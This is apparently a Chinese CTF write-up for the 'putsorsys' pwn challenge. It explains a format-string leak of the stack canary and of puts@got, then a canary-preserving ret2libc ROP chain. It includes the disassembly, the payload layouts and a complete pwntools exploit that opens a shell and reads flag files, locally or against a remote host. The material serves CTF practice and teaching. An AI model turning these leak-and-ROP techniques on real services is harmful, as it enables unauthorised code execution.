# Speedrun：putsorsys

> 题型：ret2libc + 格式化字符串 leak / 64 位 canary 绕过  
> 目标：`%13$p` leak canary，`%9$s` leak `puts@got`，第三轮保留 canary 后 ROP  
> 关键：offset **0x28**；`puts@got=0x404018`；`/bin/sh=0x40205E`；`pop rdi=libc+0x2A3E5`；`ret=libc+0x29CD6`

---

## 0. 一句话结论

```text
main 是一个 menu 循环：
  puts("Give me some gift?(0/1)")
  scanf("%d", &choice)
  if choice == 1:
      puts("What's it")
      read(0, buf, 0x100)           ; char buf[0x30] @ rbp-0x30
      puts("Oh thanks,There is my gift:")
      printf(buf)                    ; 格式化字符串漏洞
      puts("/bin/sh")
      loop
  else:
      canary check
      leave; ret

  canary @ rbp-0x8
  offset to canary = 0x30 - 0x08 = 0x28 = 40

Round 1: "%13$p"                  -> canary
Round 2: "%9$s" + p64(puts@got)   -> puts leak
Round 3: 0x28 A + canary + 8 B
         + ret + pop rdi + /bin/sh + system
choice = 0                         -> 离开循环，触发 ret
```

这是一个“格式化字符串 leak + 栈溢出”的混合题，不是纯 ret2libc。

---

## 1. 30 秒定性质

```bash
cd '/home/yfhd5/Pwn Writeups/ret2libc'

file putsorsys
checksec --file=putsorsys
nm -n putsorsys | grep -E ' (main|init)$'
objdump -d -M intel putsorsys | sed -n '/<main>:/,/^$/p'
objdump -R putsorsys | grep -E 'puts|read|printf|scanf'
objdump -s -j .rodata putsorsys
```

关键输出：

```text
ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped
Partial RELRO
Canary found
NX enabled
No PIE (0x400000)
SHSTK: Enabled
IBT: Enabled
Not stripped

00000000004011d6 T init
0000000000401262 T main

404018 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.5
```

读法：

| 观察 | 结论 |
| --- | --- |
| Canary found | 第三轮必须写回 canary |
| `printf(buf)` | 可用 `%p` leak、`%s` 任意读 |
| `read(0, buf, 0x100)` | 可以覆盖 saved RIP |
| No PIE | GOT / `/bin/sh` 地址固定 |
| Partial RELRO | `puts@got` 可读 |
| 没有 `system@plt` | 需要 ret2libc |
| menu 循环 | 可以分三轮打，不必一次完成 |
| SHSTK / IBT | 本机未启用强制 shadow stack，ROP 仍可用；不要被 checksec 吓到 |

### 1.1 `main` 反汇编

```asm
0000000000401262 <main>:
  401262: endbr64
  401266: push   rbp
  401267: mov    rbp,rsp
  40126a: sub    rsp,0x40
  40126e: mov    rax,QWORD PTR fs:0x28
  401277: mov    QWORD PTR [rbp-0x8],rax      ; canary
  ...
  401287: lea    rax,[rip+0xd76]        ; "Welcome to NewStar CTF!!"
  401291: call   401090 <puts@plt>

loop:
  401296: lea    rax,[rip+0xd80]        ; "Give me some gift?(0/1)"
  4012a0: call   401090 <puts@plt>
  4012a5: lea    rax,[rbp-0x34]         ; choice
  4012bb: call   4010e0 <scanf@plt>
  4012c0: mov    eax,DWORD PTR [rbp-0x34]
  4012c3: cmp    eax,0x1
  4012c6: jne    401326                 ; choice != 1 -> leave/ret

  4012c8: lea    rax,[rip+0xd69]        ; "What's it"
  4012d2: call   401090 <puts@plt>
  4012d7: lea    rax,[rbp-0x30]         ; buf
  4012db: mov    edx,0x100
  4012e8: call   4010c0 <read@plt>

  4012f2: lea    rax,[rip+0xd49]        ; "Oh thanks,There is my gift:"
  4012fc: call   401090 <puts@plt>

  401301: lea    rax,[rbp-0x30]
  401308: call   4010b0 <printf@plt>    ; printf(buf)

  401312: lea    rax,[rip+0xd45]        ; "/bin/sh"
  40131c: call   401090 <puts@plt>
  401321: jmp    401296                 ; loop

  401326: nop
  40132c: mov    rdx,QWORD PTR [rbp-0x8]
  401330: sub    rdx,QWORD PTR fs:0x28
  401339: je     401340
  40133b: call   4010a0 <__stack_chk_fail@plt>
  401340: leave
  401341: ret
```

等价 C：

```c
int main(void) {
    int choice;
    char buf[0x30];

    init();
    puts("Welcome to NewStar CTF!!");

    while (1) {
        puts("Give me some gift?(0/1)");
        scanf("%d", &choice);

        if (choice != 1)
            break;

        puts("What's it");
        read(0, buf, 0x100);
        puts("Oh thanks,There is my gift:");
        printf(buf);
        puts("/bin/sh");
    }

    return 0;
}
```

栈布局：

```text
rbp-0x30 .. rbp-0x01 : buf[0x30]
rbp-0x08 .. rbp-0x01 : canary（覆盖在 buf 尾部之后）
rbp+0x00 .. rbp+0x07 : saved rbp
rbp+0x08 .. rbp+0x0f : saved RIP
```

注意 `buf` 是 0x30 字节，canary 在 `rbp-8`，所以从 `buf` 起点到 canary 是：

```text
0x30 - 0x08 = 0x28 = 40
```

### 1.2 为什么 `%13$p` 是 canary

本机 glibc 下实测，`printf(buf)` 的参数槽：

| 格式参数 | 指向 |
| --- | --- |
| `%8$p` | `buf + 0x00` |
| `%9$p` | `buf + 0x08` |
| `%13$p` | `buf + 0x28` = `rbp-8` = **canary** |
| `%14$p` | `buf + 0x30` = saved rbp |

所以：

```python
p.send(b"%13$p")
canary = int(p.recvuntil(b"/bin/sh\n")[:-len(b"/bin/sh\n")], 16)
```

`printf` 后面紧跟着 `puts("/bin/sh")`，可以用 `/bin/sh\n` 当结束标记，避免把格式串输出的其它内容读进来。

### 1.3 为什么 `%9$s` 能 leak `puts@got`

`%9$s` 把第 9 个参数当作 `char *` 解引用。第 9 个参数对应 `buf + 0x08`，所以：

```python
fmt = b"%9$s\x00".ljust(8, b"\x00") + p64(PUTS_GOT)
```

- `buf + 0x00..0x07`：`"%9$s\x00"`，`printf` 看到 `\x00` 停止解析；
- `buf + 0x08..0x0f`：`p64(puts@got)`，正好是 `%9$s` 的指针参数；
- `printf` 把 `puts@got` 指向的 8 字节当成字符串输出，直到遇到 `\x00`。

`puts` 的真实地址高字节通常是 `0x00`，所以会输出 6 个有效字节；`recvuntil` 后用 `ljust(8, b"\x00")` 补齐再 `u64`。

---

## 2. libc 与 gadget

题目目录里带有 `libc.so.6`（Ubuntu glibc 2.35）：

```bash
file libc.so.6
strings -a libc.so.6 | grep 'GNU C Library'
```

exp 中使用的偏移：

| 符号 / gadget | libc 偏移 |
| --- | --- |
| `puts` | `0x80ed0` |
| `system` | `0x50d60` |
| `pop rdi; ret` | `0x2a3e5` |
| `ret` | `0x29cd6` |

`"/bin/sh"` 不需要去 libc 找，二进制 `.rodata` 里自带：

```text
0x40205e -> "/bin/sh"
```

Stage 3：

```python
payload = flat(
    b"A" * 0x28,
    canary,
    b"B" * 8,
    ret, pop_rdi, BIN_SH, system,
)
```

然后 menu 选择 `0`，让 `main` 离开循环并执行 `leave; ret`。

---

## 3. Payload 布局

### 3.1 第一轮：leak canary

```text
buf = "%13$p"
```

```python
menu(p, 1)
gift(p, b"%13$p")
canary = int(p.recvuntil(b"/bin/sh\n")[:-len(b"/bin/sh\n")], 16)
```

### 3.2 第二轮：leak puts

```text
buf:
  0x00..0x07 : "%9$s\x00\x00\x00\x00"
  0x08..0x0f : p64(0x404018)
```

```python
fmt = b"%9$s\x00".ljust(8, b"\x00") + p64(PUTS_GOT)
menu(p, 1)
gift(p, fmt)
raw = p.recvuntil(b"/bin/sh\n")[:-len(b"/bin/sh\n")]
puts_leak = u64(raw.ljust(8, b"\x00"))
```

### 3.3 第三轮：canary-safe ROP

```text
[ 0x28 'A' ][ canary ][ 8 'B' ][ ret ][ pop rdi ][ 0x40205e ][ system ]
```

```python
menu(p, 1)
gift(p, payload)
menu(p, 0)
```

`ret` 用于 16 字节栈对齐；`pop rdi` 把 `/bin/sh` 放进第一个参数；`system` 来自 libc。

---

## 4. 完整 exp

```python
from pwn import *
import os
import re
import ssl
import time

context.arch = "amd64"
context.log_level = "info"

BIN = "./putsorsys"
HOST = os.getenv("HOST", "")
PORT = int(os.getenv("PORT", "9999"))
LIBC_PATH = os.getenv("LIBC", "./libc.so.6")
LD_SO = os.getenv("LD_SO", "")
LIBC_DIR = os.getenv("LIBC_DIR", ".")

PUTS_GOT = 0x404018
BIN_SH = 0x40205E

# main: char buf[0x30] @ rbp-0x30; canary @ rbp-0x8; saved RIP @ rbp+8
OFFSET = 0x28

POP_RDI_OFF = 0x2A3E5
RET_OFF = 0x29CD6


def start():
    if args.LOCAL:
        if LD_SO:
            return process([LD_SO, "--library-path", LIBC_DIR, BIN])
        return process(BIN)

    if not HOST:
        raise SystemExit(
            "[-] set HOST/PORT, or run: python 13_putsorsys_exp.py LOCAL"
        )

    if os.getenv("SSL", "0") == "1":
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        return remote(HOST, PORT, ssl=True, ssl_context=ctx, sni=HOST)

    return remote(HOST, PORT)


def menu(p, choice):
    p.recvuntil(b"Give me some gift?(0/1)\n")
    p.sendline(str(choice).encode())


def gift(p, data):
    p.recvuntil(b"What's it\n")
    p.send(data)
    p.recvuntil(b"Oh thanks,There is my gift:\n")


def exploit():
    p = start()
    libc = ELF(LIBC_PATH, checksec=False)

    # Round 1: canary is the 13th printf argument.
    menu(p, 1)
    gift(p, b"%13$p")
    line = p.recvuntil(b"/bin/sh\n")[: -len(b"/bin/sh\n")]
    canary = int(line, 16)
    log.success(f"canary = {canary:#x}")

    # Round 2: %9$s reads buf+8 as a pointer; put puts@GOT there.
    menu(p, 1)
    fmt = b"%9$s\x00".ljust(8, b"\x00") + p64(PUTS_GOT)
    gift(p, fmt)
    raw = p.recvuntil(b"/bin/sh\n")[: -len(b"/bin/sh\n")]
    puts_leak = u64(raw.ljust(8, b"\x00"))
    libc_base = puts_leak - libc.symbols["puts"]
    if libc_base & 0xFFF:
        raise SystemExit(
            f"[-] libc base {libc_base:#x} is not page aligned; "
            "LIBC does not match the target"
        )
    system = libc_base + libc.symbols["system"]
    pop_rdi = libc_base + POP_RDI_OFF
    ret = libc_base + RET_OFF
    log.success(
        f"puts = {puts_leak:#x}, libc = {libc_base:#x}, system = {system:#x}"
    )

    # Round 3: keep canary, overflow saved RIP, then choose 0.
    menu(p, 1)
    payload = flat(
        b"A" * OFFSET,
        canary,
        b"B" * 8,
        ret, pop_rdi, BIN_SH, system,
    )
    gift(p, payload)
    menu(p, 0)

    time.sleep(0.2)
    p.sendline(
        b"echo __PWNED__; cat flag* 2>/dev/null; cat /flag* 2>/dev/null; exit"
    )

    out = p.recvall(timeout=10).decode("utf-8", errors="ignore")
    print(out)

    flags = re.findall(r"(?:flag|CTF2|DASCTF)\{[^}]+\}", out, re.I)
    if flags:
        print(f"[+] GOT THE FLAG: {flags[0]}")
    else:
        print("[-] flag not found, raw output above")


if __name__ == "__main__":
    exploit()
```

本地验证（用 bundled libc + 一个匹配的 2.35 loader）：

```bash
cd '/home/yfhd5/Pwn Writeups/ret2libc'
LIBC=./libc.so.6 \
LD_SO=/tmp/libc235/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 \
LIBC_DIR=. \
../.venv/bin/python 13_putsorsys_exp.py LOCAL
```

本机验证输出：

```text
[+] canary = 0xf8ca3dfbdb350c00
[+] puts = 0x718246480ed0, libc = 0x718246400000, system = 0x718246450d60
__PWNED__
```

远程：

```bash
HOST=... PORT=... LIBC=./libc.so.6 python 13_putsorsys_exp.py
# 平台要 TLS 时设置 SSL=1
```

---

## 5. 交互坑

1. **`%13$p` 是 canary，`%9$s` 的指针放在 `buf+8`**  
   本机实测参数槽是 `%8$` 对应 `buf+0`。不同 glibc 可能偏移；先用 `%7$p...%17$p` 探一遍。

2. **每轮都要等 `Give me some gift?(0/1)`**  
   `menu()` 里先 `recvuntil` 再发 choice；不要连续 `sendline(1)`，否则 `scanf` 会把下一轮输入提前读走。

3. **`gift()` 必须等 `Oh thanks,There is my gift:`**  
   程序先打印这一行，再执行 `printf(buf)`；不等的话，leak 可能还没产生就去读。

4. **第一轮/第二轮用 `/bin/sh\n` 当结束标记**  
   `printf(buf)` 后面紧跟着 `puts("/bin/sh")`；用 `recvuntil(b"/bin/sh\n")` 能准确截断格式串输出，不会把下一轮菜单读进来。

5. **第三轮 payload 发完后还要发 `choice=0`**  
   只溢出不离开循环，`main` 会继续 menu；必须 `menu(p, 0)` 才会执行 `leave; ret`。

6. **canary 必须原样写回**  
   `[0x28 A][canary][8 B]`；顺序错、少 8 字节 padding 都会触发 `__stack_chk_fail`。

7. **`ret` 不能省**  
   `system` 对 16 字节对齐敏感；`ret; pop rdi; binsh; system` 是验证过的布局。

8. **libc 用题目附件**  
   `LIBC` 环境变量默认 `./libc.so.6`；`puts` / `system` / gadget 偏移都按这个文件。  
   如果换成系统 libc，`puts` 偏移和 gadget 偏移都要重算。

9. **本地 loader**  
   仓库只带了 libc，没有带 `ld-2.35.so`；本地用 `/tmp/libc235/.../ld-linux-x86-64.so.2` 搭配 `LIBC_DIR=.` 运行。  
   没有匹配 loader 时，直接 `process(BIN)` 会用到系统 2.39/2.43 的 libc，`ELF` / `libc.symbols` 仍可工作，但需要把 `LIBC` 改成 `/lib/x86_64-linux-gnu/libc.so.6`。

10. **SHSTK / IBT 不是这题的门槛**  
    本机未启用强制 shadow stack；ROP 仍然成功。遇到真实 CET 环境再考虑 SROP / 其它路线。

---

## 6. 2 分钟速通时间线

| 时间 | 动作 |
| --- | --- |
| 0:00–0:20 | `file` + `checksec`：64 位、Canary、No PIE、Partial RELRO、`printf(buf)` |
| 0:20–0:45 | `objdump main`：menu 循环，`buf=rbp-0x30`，canary offset 0x28 |
| 0:45–1:05 | 第一轮 `%13$p` leak canary |
| 1:05–1:30 | 第二轮 `%9$s` + `p64(puts@got)` leak libc |
| 1:30–1:55 | 第三轮 canary-safe ROP：`ret; pop rdi; /bin/sh; system` |
| 1:55–2:10 | `choice=0` 触发 ret，本地 `__PWNED__`，再打远程 |

---

## 7. 题型识别卡

```text
64 位 + Canary + No PIE + Partial RELRO
+ menu 循环 + printf(user_input)
+ read(0, buf, 0x100)，buf 后面有 canary
= 格式化字符串 leak canary / libc，第三轮保留 canary 栈溢出 ROP
```

一句话：**`%13$p` 拿 canary，`%9$s` + `p64(puts@got)` 拿 libc，`0x28 + canary + 8` 后接 `ret/pop rdi//bin/sh/system`，最后选 0。**


